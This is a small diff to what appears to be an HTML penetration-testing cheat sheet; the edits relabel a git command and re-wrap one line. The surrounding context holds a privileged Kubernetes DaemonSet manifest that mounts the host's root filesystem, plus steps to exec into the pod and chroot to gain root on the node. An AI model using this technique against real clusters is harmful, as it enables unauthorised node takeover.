@@ -36,7 +36,7 @@ layout: default
         </tr>
         <tr>
             <td>Check differences between two specific commits</td>
-            <td>git diff &lt;commit 1&gt; &lt;commit 2&gt;</td>
+            <td>git diff &lt;older commit&gt; &lt;newer commit&gt;</td>
         </tr>
     </table>
 
@@ -489,7 +489,8 @@ layout: default
                 <pre>apiVersion: apps/v1&#13;&#10;kind: DaemonSet&#13;&#10;metadata:&#13;&#10;  name: noderootpod&#13;&#10;  labels:&#13;&#10;spec:&#13;&#10;  selector:&#13;&#10;    matchLabels:&#13;&#10;      name: noderootdaemon&#13;&#10;  template:&#13;&#10;    metadata:&#13;&#10;      labels:&#13;&#10;        name: noderootdaemon&#13;&#10;    spec:&#13;&#10;      tolerations:&#13;&#10;      - key: node-role.kubernetes.io/master&#13;&#10;        effect: NoSchedule&#13;&#10;      hostNetwork: true&#13;&#10;      hostPID: true&#13;&#10;      hostIPC: true&#13;&#10;      containers:&#13;&#10;      - name: noderootpod&#13;&#10;        <mark>image: busybox (or another valid known image, i.e. pick one from another pre-existing pod)</mark>&#13;&#10;        securityContext:&#13;&#10;          privileged: true&#13;&#10;        volumeMounts:&#13;&#10;        - mountPath: /host&#13;&#10;          name: noderoot&#13;&#10;        command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]&#13;&#10;        args: [ &quot;while true; do sleep 30; done;&quot; ]&#13;&#10;      volumes:&#13;&#10;      - name: noderoot&#13;&#10;        hostPath:&#13;&#10;          path: /</pre>
                 <li>Get root on chosen pod</li>
                 <ul>
-                    <li>Get a shell on a pod: kubectl exec -it &lt;chosen pod from &quot;kubectl get po&quot; output&gt; chroot /host</li>
+                    <li>Get a shell on a pod: kubectl exec -it &lt;chosen pod from &quot;kubectl get po&quot; output&gt;
+                        chroot /host</li>
                     <ul>
                         <li>If unable to exec on new pod using kubectl, then try kubeletctl to access the new pod</li>
                     </ul>
